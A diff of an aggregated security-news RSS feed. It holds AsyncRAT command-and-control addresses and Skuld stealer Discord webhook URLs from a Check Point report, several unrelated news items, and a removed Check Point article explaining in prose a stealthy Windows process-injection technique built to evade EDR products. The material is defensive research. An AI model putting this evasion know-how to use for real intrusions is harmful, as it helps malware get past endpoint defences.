+&lt;p&gt;&lt;strong&gt;AsyncRAT C2:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;101.99.76.120&lt;/li&gt;
+
+
+
+&lt;li&gt;87.120.127.37&lt;/li&gt;
+
+
+
+&lt;li&gt;185.234.247.8&lt;/li&gt;
+
+
+
+&lt;li&gt;microads[.]top&lt;/li&gt;
+&lt;/ul&gt;
+
+
+
+&lt;p&gt;&lt;strong&gt;Skuld Discord Webhooks:&lt;/strong&gt;&lt;/p&gt;
+
+
+
+&lt;ul class="wp-block-list"&gt;
+&lt;li&gt;https://discord[.]com/api/webhooks/1355186248578502736/_RDywh_K6GQKXiM5T05ueXSSjYopg9nY6XFJo1o5Jnz6v9sih59A8p-6HkndI_nOTicO&lt;/li&gt;
+
+
+
+&lt;li&gt;https://discord[.]com/api/webhooks/1348629600560742462/RJgSAE7cYY-1eKMkl5EI-qZMuHaujnRBMVU_8zcIaMKyQi4mCVjc9R0zhDQ7wmPoD7Xp&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/"&gt;From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31476</guid><category>Check Point Research Publications</category><category>Threat Research</category></item><item><title>Is Google Password Manager Safe to Use in 2025?</title><link>https://www.techrepublic.com/article/is-google-password-manager-safe/</link><description>Google Password Manager is a free password management service built into Chrome and Google apps. Learn how it works and how secure it is in this detailed review.</description><guid isPermaLink="false">https://www.techrepublic.com/?p=4264691</guid><category>Cloud Security</category><category>Security</category><category>google password manager</category><category>password manager</category></item><item><title>Infocon: green</title><link>https://isc.sans.edu/diary.html?rss</link><description>ISC Stormcast For Thursday, June 12th, 2025 https://isc.sans.edu/podcastdetail/9490</description><guid isPermaLink="false">https://isc.sans.edu/diary.html?rss</guid></item><item><title>Celebrating 11 years of Project Galileo’s global impact</title><link>https://blog.cloudflare.com/celebrating-11-years-of-project-galileo-global-impact/</link><description>June 2025 marks the 11th anniversary of Project Galileo, Cloudflare’s effort to protect vulnerable public interest organizations from cyber threats.</description><content:encoded>&lt;p&gt;June 2025 marks the 11th anniversary of &lt;a href="https://www.cloudflare.com/galileo/"&gt;&lt;u&gt;Project Galileo&lt;/u&gt;&lt;/a&gt;, Cloudflare’s initiative to provide free cybersecurity protection to vulnerable organizations working in the public interest around the world. From independent media and human rights groups to community activists, Project Galileo supports those often targeted for their essential work in human rights, civil society, and democracy building.&lt;/p&gt;&lt;p&gt;A lot has changed since we marked the &lt;a href="https://blog.cloudflare.com/pt-br/celebrating-10-years-of-project-galileo/"&gt;&lt;u&gt;10th anniversary&lt;/u&gt;&lt;/a&gt; of Project Galileo. Yet, our commitment remains the same: help ensure that organizations doing critical work in human rights have access to the tools they need to stay online.  We believe that organizations, no matter where they are in the world, deserve reliable, accessible protection to continue their important work without disruption.&lt;/p&gt;&lt;p&gt;For our 11th anniversary, we're excited to share several updates including:&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;An interactive &lt;a href="https://radar.cloudflare.com/reports/project-galileo-11th-anniv"&gt;&lt;u&gt;Cloudflare Radar report&lt;/u&gt;&lt;/a&gt; providing insights into the cyber threats faced by at-risk public interest organizations protected under the project. &lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;An expanded commitment to digital rights in the Asia-Pacific region with two new Project Galileo partners.&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href="https://www.cloudflare.com/project-galileo-case-studies/"&gt;&lt;u&gt;New stories &lt;/u&gt;&lt;/a&gt;from organizations protected by Project Galileo working on the frontlines of civil society, human rights, and journalism from around the world.&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;
           &lt;figure&gt;
           &lt;img src="https://cf-assets.www.cloudflare.com/zkvhlag99gkb/3xVNGtdTOw6NXqSfzU7Up1/8a2cbe643108fa97a4d14af477a6cb80/image3.png" /&gt;
           &lt;/figure&gt;
@@ -15801,757 +17285,7 @@ version." src="https://research.checkpoint.com/wp-content/uploads/2025/04/LX79FK
 
 
 &lt;p&gt;&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/apt29-phishing-campaign/"&gt;Renewed APT29 Phishing Campaign Against European Diplomats&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</content:encoded><guid isPermaLink="false">https://research.checkpoint.com/?p=31347</guid><category>Check Point Research Publications</category></item><item><title>What Kind of Business Should I Start? 5 Factors to Consider</title><link>https://www.techrepublic.com/resource-library/guide/5-factors-for-starting-business/</link><description>New entrepreneurs can use this guide to boost their chances of success when choosing a type of business. Constantly Updated — The download contains the latest and most accurate details. Enhance Your Knowledge — This nine-page PDF looks at budgeting, funding, market demand, and more. Expert Guidance — Written by Madeline Clarke through 20 hours ...</description><guid isPermaLink="false">https://www.techrepublic.com/resource-library/whitepapers/5-factors-for-starting-business/</guid><category>Additional Resources</category><category>Innovation</category><category>Startups</category></item><item><title>ZDI-23-1527 and ZDI-23-1528: The Potential Impact of Overly Permissive SAS Tokens on PC Manager Supply Chains</title><link>https://www.trendmicro.com/en_us/research/25/d/zdi-23-1527-and-zdi-23-1528-the-potential-impact-of-overly-permi.html</link><description>In ZDI-23-1527 and ZDI-23-1528 we uncover two possible scenarios where attackers could have compromised the Microsoft PC Manager supply chain.</description><guid isPermaLink="false">urn:uuid:b9fcbbdb-39d3-9cad-5e2a-b27c04786f95</guid><category>Trend Micro Research : Cyber Risk</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Research</category></item><item><title>Strengthen Security with Cyber Risk Advisory</title><link>https://www.trendmicro.com/en_us/research/25/d/cyber-risk-advisory.html</link><description>In today’s fast-paced digital world, cyber threats are constantly evolving. Attackers are leveraging advanced techniques and artificial intelligence (AI) to exploit vulnerabilities, leaving organizations vulnerable to breaches and disruptions. To combat these challenges, organizations must stay vigilant and implement more proactive cybersecurity measures. This is where our Cyber Risk Advisory service, powered by the Trend Vision One™ Cyber Risk Exposure Management (CREM) solution, step in to provide a strategic edge.</description><guid isPermaLink="false">urn:uuid:690d8095-8768-1c08-ee5c-3f4b35649b5b</guid><category>Trend Micro Research : Cloud</category><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Endpoints</category><category>Trend Micro Research : Network</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Data center</category></item><item><title>Top 10 for LLM &amp; Gen AI Project Ranked by OWASP</title><link>https://www.trendmicro.com/en_us/research/25/d/top-llm-gen-ai.html</link><description>Trend Micro has become a Gold sponsor of the OWASP Top 10 for LLM and Gen AI Project, merging cybersecurity expertise with OWASP's collaborative efforts to address emerging AI security risks. This partnership underscores Trend Micro's unwavering commitment to advancing AI security, ensuring a secure foundation for the transformative power of AI.</description><guid isPermaLink="false">urn:uuid:94875dc5-8bf7-814c-44bb-6c3a40d98fdd</guid><category>Trend Micro Research : Latest News</category><category>Trend Micro Research : Exploits &amp; Vulnerabilities</category><category>Trend Micro Research : Artificial Intelligence (AI)</category><category>Trend Micro Research : Articles, News, Reports</category><category>Trend Micro Research : Cyber Threats</category></item><item><title>Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking</title><link>https://research.checkpoint.com/2025/waiting-thread-hijacking/</link><description>&lt;p&gt;Research by: hasherezade Key Points Introduction Process injection is one of the&amp;#160;important techniques used by attackers. We can find its variants implemented in almost every malware. It serves purposes such as: In&amp;#160;our previous blog&amp;#160;on&amp;#160;process injections&amp;#160;we explained the foundations of this topic and basic ideas behind detection and prevention. We also proposed a new technique dubbed&amp;#160;Thread [&amp;#8230;]&lt;/p&gt;
-&lt;p&gt;The post &lt;a href="https://research.checkpoint.com/2025/waiting-thread-hijacking/"&gt;Waiting Thread Hijacking: A Stealthier Version of Thread Execution Hijacking&lt;/a&gt; appeared first on &lt;a href="https://research.checkpoint.com"&gt;Check Point Research&lt;/a&gt;.&lt;/p&gt;</description><content:encoded>&lt;p&gt;&lt;strong&gt;Research by:&lt;/strong&gt; hasherezade&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="key-points"&gt;Key Points&lt;/h1&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Process Injection is one of the important techniques in the attackers’ toolkit. In the constant cat-and-mouse game, attackers try to invent its new implementations that bypass defenses, using creative methods and lesser-known APIs.&lt;/li&gt;
-
-
-
-&lt;li&gt;Combining common building blocks in an atypical way, Check Point Research was able to create a much stealthier version of a known method, Thread Execution Hijacking.&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="introduction"&gt;Introduction&lt;/h1&gt;
-
-
-
-&lt;p&gt;Process injection is one of the&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055"&gt;important techniques used by attackers&lt;/a&gt;. We can find its variants implemented in almost every malware. It serves purposes such as:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;defense evasion: hiding malicious modules under the cover of a different process&lt;/li&gt;
-
-
-
-&lt;li&gt;interference with existing processes: reading their memory, hooking used APIs, etc.&lt;/li&gt;
-
-
-
-&lt;li&gt;privilege escalation&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;In&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;our previous blog&lt;/a&gt;&amp;nbsp;on&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/"&gt;process injections&lt;/a&gt;&amp;nbsp;we explained the foundations of this topic and basic ideas behind detection and prevention. We also proposed a new technique dubbed&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;Thread Name-Calling&lt;/a&gt;&amp;nbsp;&amp;#8211; abusing the Thread Name API that was originally intended to assign names to running threads. The technique allowed writing to a process using a handle without write access. Remote execution was achieved through&amp;nbsp;&lt;a href="https://repnz.github.io/posts/apc/user-apc/#ntqueueapcthreadex2-some-new-friends-in-the-fast-ring"&gt;the new API for Asynchronous Procedure Calls (APC)&lt;/a&gt;, requesting a Special User APC. With the help of those building blocks, we were able to inject a payload and run it without being noticed by most tested EDRs (Endpoint Detection &amp;amp; Response systems). While remote write was implemented using an unexpected API, execution wasn’t completely novel since it was a variant of&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/004"&gt;APC injection&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;In the current research, we aim for the same goal: stealthy injection into a running process. This time we approach the problem from the opposite direction. We use common allocate and write primitives to achieve unexpected code execution. Furthermore, we show how to extend the implementation and obfuscate the called sequence of APIs in order to tamper behavioral signatures that could be used for detection. The described technique intercepts the flow of a waiting thread and misuses it for the execution of an implant &amp;#8211; that’s why we dubbed it Waiting Thread Hijacking (WTH). It can be treated as an evolution of classic&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;Thread Hijacking&lt;/a&gt;. Unlike the older method, WTH avoids using APIs that trigger most alerts, such as&amp;nbsp;&lt;code&gt;SuspendThread&lt;/code&gt;&amp;nbsp;/&amp;nbsp;&lt;code&gt;ResumeThread&lt;/code&gt;&amp;nbsp;and&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;&lt;code&gt;SetThreadContext&lt;/code&gt;&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;It involves handles with the following access:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;For the target process:&amp;nbsp;&lt;code&gt;PROCESS_VM_OPERATION&lt;/code&gt;,&amp;nbsp;&lt;code&gt;PROCESS_VM_READ&lt;/code&gt;,&amp;nbsp;&lt;code&gt;PROCESS_VM_WRITE&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;For the target thread:&amp;nbsp;&lt;code&gt;THREAD_GET_CONTEXT&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Used APIs:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;code&gt;NtQuerySystemInformation&lt;/code&gt;&amp;nbsp;(with a parameter of&amp;nbsp;&lt;code&gt;SystemProcessInformation&lt;/code&gt;&amp;nbsp;)&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;GetThreadContext&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;ReadProcessMemory&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;VirtualAllocEx&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;WriteProcessMemory&lt;/code&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;code&gt;VirtualProtectEx&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;The considered target is a 64-bit process with&amp;nbsp;&lt;a href="https://jsecurity101.medium.com/better-know-a-data-source-process-integrity-levels-8338f3b74990"&gt;medium integrity&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="executing-remote-code"&gt;Executing Remote Code&lt;/h1&gt;
-
-
-
-&lt;p&gt;To prevent remote code execution, AVs and EDRs try to monitor APIs related to known techniques (examples of monitored functions can be found in Mr-Un1k0d3r’s repository: &lt;a href="https://github.com/Mr-Un1k0d3r/EDRs" rel="noreferrer noopener" target="_blank"&gt;https://github.com/Mr-Un1k0d3r/EDRs&lt;/a&gt;). The implementation of restrictions differs from product to product. While some products tolerate remote allocation and write, an attempt to run the implant will surely result in detection. Options for triggering execution are very limited, and all APIs meant for this purpose are closely watched. That’s why finding a new, unexpected way to do so is one of the biggest challenges attackers and red teamers face while trying to implement code injection.&lt;/p&gt;
-
-
-
-&lt;p&gt;The basic constraint is that code runs on &lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=4"&gt;threads&lt;/a&gt;. This leaves us with two possibilities: either to create a new thread in the target process, or to use some of the existing ones. An alternative way to run code are &lt;a href="https://www.ired.team/offensive-security/code-injection-process-injection/executing-shellcode-with-createfiber"&gt;fibers&lt;/a&gt; (example: &lt;em&gt;ImmoralFiber, &lt;a href="https://github.com/JanielDary/ImmoralFiber"&gt;BlackHat Asia 2024&lt;/a&gt;&lt;/em&gt;), although at a low level they are still &lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/fibers"&gt;managed by threads&lt;/a&gt;. While using fibers can help in hiding execution within a local process, it is not much helpful in achieving remote execution. In order to use them to run code within a remote process, the target must already have existing fibers. This drastically narrows down the list of possible targets, making this method unusable in most real-life scenarios.&lt;/p&gt;
-
-
-
-&lt;p&gt;The common approaches to remotely execute injected code:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;Remote thread creation&lt;/li&gt;
-
-
-
-&lt;li&gt;Adding a function to the APC queue of an existing thread&lt;/li&gt;
-
-
-
-&lt;li&gt;Direct manipulation of an existing thread’s context (&lt;code&gt;GetThreadContext&lt;/code&gt;/&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;). This includes using&amp;nbsp;&lt;a href="https://www.alex-ionescu.com/rtlremotecall/"&gt;&lt;code&gt;RtlRemoteCall&lt;/code&gt;&lt;/a&gt;&amp;nbsp;API (since it calls&amp;nbsp;&lt;code&gt;GetThreadContext&lt;/code&gt;/&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;&amp;nbsp;underneath).&lt;/li&gt;
-
-
-
-&lt;li&gt;Installing hooks&lt;/li&gt;
-
-
-
-&lt;li&gt;Replacing the defined callbacks&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;Let’s analyze each option one by one.&lt;/p&gt;
-
-
-
-&lt;p&gt;Creating a remote thread is straightforward, and involves using one of the APIs from the&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadscreateremotethread"&gt;CreateRemoteThread&lt;/a&gt;&amp;nbsp;series. Although we may&amp;nbsp;&lt;a href="https://aliongreen.github.io/posts/remote-thread-injection.html"&gt;apply it in various ways&lt;/a&gt;, calling high- or low-level versions of those functions or even using raw syscalls, the end result won’t be very stealthy. Creation of a new thread generates a kernel callback that makes an EDR quickly notified about the suspicious intentions (via&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutine"&gt;&lt;code&gt;PsSetCreateThreadNotifyRoutine&lt;/code&gt;&lt;/a&gt;/&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-pssetcreatethreadnotifyroutineex"&gt;&lt;code&gt;Ex&lt;/code&gt;&lt;/a&gt;&lt;strong&gt;)&lt;/strong&gt;,&lt;/p&gt;
-
-
-
-&lt;p&gt;This leads to the conclusion that what pays off more is giving up on creating new threads altogether, and somehow hopping onto an existing one. The most straightforward and convenient way is using APC, as it was explained in details in the&amp;nbsp;&lt;a href="https://research.checkpoint.com/2024/thread-name-calling-using-thread-name-for-offense/"&gt;blog about Thread Name-Calling&lt;/a&gt;. This method however also has its drawbacks. In this scenario a kernel callback won’t be triggered, but yet, it generates an&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/devtest/event-tracing-for-windows--etw-"&gt;ETW event&lt;/a&gt;, for which an AV/EDR product can listen. Second, a handle to the thread must be opened with&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;&amp;nbsp;access. The event of opening a handle also generates a kernel callback (that can be monitored in kernel mode via&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-obregistercallbacks"&gt;ObRegisterCallbacks&lt;/a&gt;), so we should tend to avoid suspicious flags, and minimize the requested access.&lt;/p&gt;
-
-
-
-&lt;p&gt;Direct manipulation of an existing thread is a part of another old and well-known method, called&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;thread execution hijacking&lt;/a&gt;. It involves finding a thread within the target process, suspending it, changing its context to redirect the execution flow into our own code, and then resuming it. Just like APC injection, it requires the thread handle to be open with&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;, plus another suspicious flag:&amp;nbsp;&lt;code&gt;THREAD_SUSPEND_RESUME&lt;/code&gt;. Another problem is that the APIs related to this method are usually monitored, which will get us stopped by an EDR. If we give up on all functions that require modifications of the thread context, we are left with simple writes to the target process’ memory. This seems like not much, but using it creatively can still achieve code execution.&lt;/p&gt;
-
-
-
-&lt;p&gt;One of the basic ideas from this category is API hooking. We can predict that there are some functions within the process that will be called at some point. If we intercept them, we can get our code to run alongside. There are multiple different options to implement hooks: inline as well as in IAT (Import Address Table) or EAT (Export Address Table). However, installing them requires overwriting a part of the loaded DLL, which often raises alerts.&lt;/p&gt;
-
-
-
-&lt;p&gt;The more creative approach is based on the fact that a process may use various callbacks executed on particular events. If we overwrite a pointer to the callback function, we can force our code to be executed instead. There are a variety of publications detailing different methods from this group. A few examples include:&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;a href="https://attack.mitre.org/techniques/T1055/005/"&gt;Overwriting TLS callbacks&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;&lt;a href="https://attack.mitre.org/techniques/T1574/013/"&gt;Overwriting Kernel Callback Table&lt;/a&gt;&lt;/li&gt;
-
-
-
-&lt;li&gt;Overwriting GUI callbacks (examples:&amp;nbsp;&lt;a href="https://web.archive.org/web/20240316160018/https://modexp.wordpress.com/2019/04/25/seven-window-injection-methods/"&gt;odzhan blog&lt;/a&gt;&amp;nbsp;#1)&lt;/li&gt;
-
-
-
-&lt;li&gt;Overwriting ETW callbacks (example:&amp;nbsp;&lt;a href="https://web.archive.org/web/20240324163515/https://modexp.wordpress.com/2020/04/08/red-teams-etw/"&gt;odzhan blog&lt;/a&gt;&amp;nbsp;#2)&lt;/li&gt;
-
-
-
-&lt;li&gt;PROPagate &amp;#8211; running code using Windows subclassing (&lt;a href="https://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/"&gt;hexacorn blog&lt;/a&gt;&amp;nbsp;#1,&amp;nbsp;&lt;a href="https://www.hexacorn.com/blog/2017/11/03/propagate-a-new-code-injection-trick-64-bit-and-32-bit/"&gt;hexacorn blog&lt;/a&gt;&amp;nbsp;#2)&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;An interesting and novel addition to this group was a technique described by Alon Leviev in his publication on&amp;nbsp;&lt;a href="https://www.safebreach.com/blog/process-injection-using-windows-thread-pools/"&gt;Thread “Pool-Party”&lt;/a&gt;. His idea is based on the fact that Windows makes heavy use of&amp;nbsp;&lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6"&gt;thread pools&lt;/a&gt;. By getting a handle to the Worker Factory of the target, we can manipulate its structure to link to our implant and enforce its execution. For example, we can overwrite the start address within the Worker Factory’s structure redirecting it to our shellcode, and then trigger its run. It is also possible to install a new work item into the remote process by manually writing its structure and attaching it to the Worker Factory’s queue.&lt;/p&gt;
-
-
-
-&lt;p&gt;In the solution that we are going to introduce, some of the observations mentioned in the Alon’s paper will be used as well. However, the whole technique is much simpler and based on manipulating one of the threads that are products of the factory rather than the factory itself.&lt;/p&gt;
-
-
-
-&lt;h1 class="wp-block-heading" id="what-the-hell-is-waiting-thread-hijacking"&gt;What Problems Waiting Thread Hijacking Solves?&lt;/h1&gt;
-
-
-
-&lt;p&gt;Waiting Thread Hijacking is a method inspired by the concepts of the&amp;nbsp;&lt;a href="https://attack.mitre.org/techniques/T1055/003/"&gt;classic Thread Execution Hijacking&lt;/a&gt;, and the research about the&amp;nbsp;&lt;a href="https://www.microsoftpressstore.com/articles/article.aspx?p=2233328&amp;amp;seqNum=6"&gt;Thread Pool&lt;/a&gt;. However, its usage is not strictly limited to the threads belonging to the thread pool.&lt;/p&gt;
-
-
-
-&lt;p&gt;Let’s think about what the biggest problems with the classic Thread Execution Hijacking are.&lt;/p&gt;
-
-
-
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;First of all, we have to suspend a remote thread, and resume it afterwards. This may create some synchronization issues in the target application. But most importantly, it forces us to use&amp;nbsp;&lt;code&gt;SuspendThread&lt;/code&gt;/&amp;nbsp;&lt;code&gt;ResumeThread&lt;/code&gt;&amp;nbsp;API, and the thread handle with the access&amp;nbsp;&lt;code&gt;THREAD_SUSPEND_RESUME&lt;/code&gt;. Those are suspicious indicators that will surely be observed by an EDR.
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;em&gt;If only we could find a process where this is done automatically on the target side, we would avoid this hurdle…&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-
-
-
-&lt;li&gt;Second, we need to redirect execution of the suspended thread to the implant. In the classic version of this technique,&amp;nbsp;&lt;code&gt;SetThreadContext&lt;/code&gt;&amp;nbsp;(or its low-level equivalent,&amp;nbsp;&lt;a href="https://ntdoc.m417z.com/ntsetcontextthread"&gt;&lt;code&gt;NtSetContextThread&lt;/code&gt;&lt;/a&gt;) is used. The redirection is done by modifying the Instruction Pointer. The direct setting of the thread context is very suspicious, and&amp;nbsp;&lt;a href="https://medium.com/tenable-techblog/api-series-setthreadcontext-d08c9f84458d"&gt;noisy (generates two different ETW events)&lt;/a&gt;. It will most likely get us flagged by the AV/EDR. Also, it requires&amp;nbsp;&lt;code&gt;THREAD_SET_CONTEXT&lt;/code&gt;&amp;nbsp;access on the handle, which we would like to avoid.
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;em&gt;Is it possible to change the thread’s execution flow without manually modifying its context?&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-
-
-
-&lt;li&gt;Finally, returning to the original execution flow won’t be seamless. We need to store the original thread context somewhere, and restore it at our shellcode’s exit. The stability of the target process may be at risk.
-&lt;ul class="wp-block-list"&gt;
-&lt;li&gt;&lt;em&gt;Is it possible to just return to the original execution without the need to set the thread context again?&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;/li&gt;
-&lt;/ul&gt;
-
-
-
-&lt;p&gt;It turns out, those limitations can be overcome with a few simple tricks.&lt;/p&gt;
-
-
-
-&lt;p&gt;An old-school step used in the exploitation of buffer overflows is replacing the return address of the function with our own address. A working exploit may involve other primitives, like allocation of executable memory, or adding the execution permission. In order to circumvent this, restrictions like&amp;nbsp;&lt;a href="https://www.ired.team/offensive-security/defense-evasion/acg-arbitrary-code-guard-processdynamiccodepolicy"&gt;DCP (Dynamic Code Prohibited)&lt;/a&gt; have been invented. Those are also the typical events that Anti-exploit software will monitor. However, DCP policies do not apply if the executable memory is allocated within the target via an external process. It turns out, that the event of replacing the return address may also go unnoticed if it is done externally. In the current technique, we take advantage of it.&lt;/p&gt;
-
-
-
-&lt;p&gt;Still, we need to be very selective under which circumstances the return address can be overwritten. Since we have to avoid manual suspending/resuming of threads, we will use the threads that let us achieve the same effect by their own features. That is, waiting threads, which return addresses we can manipulate without destabilizing the whole application. Such threads can easily be found thanks to Thread Pools.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="thread-pools-basics"&gt;Thread Pools Basics&lt;/h2&gt;
-
-
-
-&lt;p&gt;The&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools"&gt;concept of Thread Pools&lt;/a&gt;&amp;nbsp;has been around since early editions of Windows, and its modern form was introduced in Vista. The details of the API, and its evolution are&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-pools"&gt;described on MSDN&lt;/a&gt;.&lt;/p&gt;
-
-
-
-&lt;p&gt;Thread Pools are the way of optimizing the thread creation and task processing. Rather than creating a new thread each time when there is some new event to handle, we have a set of ready-made threads that are reused. Part of the Thread Pool architecture is the presence of work queue and waiter threads.&lt;/p&gt;
-
-
-
-&lt;p&gt;By inspecting processes using tools like Process Explorer or&amp;nbsp;&lt;a href="https://systeminformer.com/"&gt;System Informer&lt;/a&gt;, you can observe the thread pool mechanism at work. Most of the default Windows processes consist of multiple threads, many of which are in a waiting state. The callstacks of those threads contain functions prefixed with&amp;nbsp;&lt;code&gt;Tp*&lt;/code&gt;&amp;nbsp;&amp;#8211; that stand for Thread Pool.&lt;/p&gt;
-
-
-
-&lt;figure class="wp-block-image aligncenter"&gt;&lt;img alt="Figure 2 - View from ProcessExplorer. Example of the callstack of a
-thread belonging to a pool, and waiting in the WrQueue." src="https://research.checkpoint.com/wp-content/uploads/2025/04/1BJM555JLK-rId58.png" /&gt;&lt;figcaption class="wp-element-caption"&gt;Figure 1 &amp;#8211; View from ProcessExplorer. Example of the callstack of a thread belonging to a pool, and waiting in the WrQueue.&lt;/figcaption&gt;&lt;/figure&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="taking-advantage-of-thread-pools"&gt;Taking Advantage of Thread Pools&lt;/h2&gt;
-
-
-
-&lt;p&gt;On any modern Windows system we find&amp;nbsp;&lt;a href="https://scorpiosoftware.net/2022/03/21/threads-threads-and-more-threads/"&gt;plenty of processes with waiting threads&lt;/a&gt;, that are managed by a Thread Pool. They can provide the building blocks to create a stealthier version of Thread Execution Hijacking.&lt;/p&gt;
-
-
-
-&lt;p&gt;Rather than suspending and then resuming one of the existing threads, we can take advantage of one of the waiting threads that are dormant. These threads will automatically reactivate on the awaited event, giving us exactly the effect that we wanted to achieve, without the need of calling external APIs.&lt;/p&gt;
-
-
-
-&lt;p&gt;Another problem to solve was related to changing the thread context. This time we won’t manipulate the instruction pointer directly. In the considered case, we are dealing with the thread that waits on a syscall for its completion. The last executed function was simply a corresponding syscall wrapper within NTDLL. Knowing that those wrappers use a very simple layout, we are sure that the last element on the stack is a return address. So, we can simply get the context of the thread, read the stack pointer, and then replace the return address with the pointer to our own code.&lt;/p&gt;
-
-
-
-&lt;p&gt;All that is needed to perform those operations is a thread handle with&amp;nbsp;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/thread-security-and-access-rights"&gt;&lt;code&gt;THREAD_GET_CONTEXT&lt;/code&gt;&lt;/a&gt;, and a process handle with the read/write permissions (&amp;nbsp;&lt;code&gt;&lt;a href="https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights" rel="noreferrer noopener" target="_blank"&gt;PROCESS_VM_READ | PROCESS_VM_WRITE&lt;/a&gt;&lt;/code&gt;&amp;nbsp;).&lt;/p&gt;
-
-
-
-&lt;p&gt;While interference in threads involving suspending/resuming and manual context setting will be blocked by most EDRs, this approach allows to avoid the common triggers and achieve the code execution.&lt;/p&gt;
-
-
-
-&lt;h2 class="wp-block-heading" id="identifying-suitable-threads"&gt;Identifying Suitable Threads&lt;/h2&gt;
-
-
-
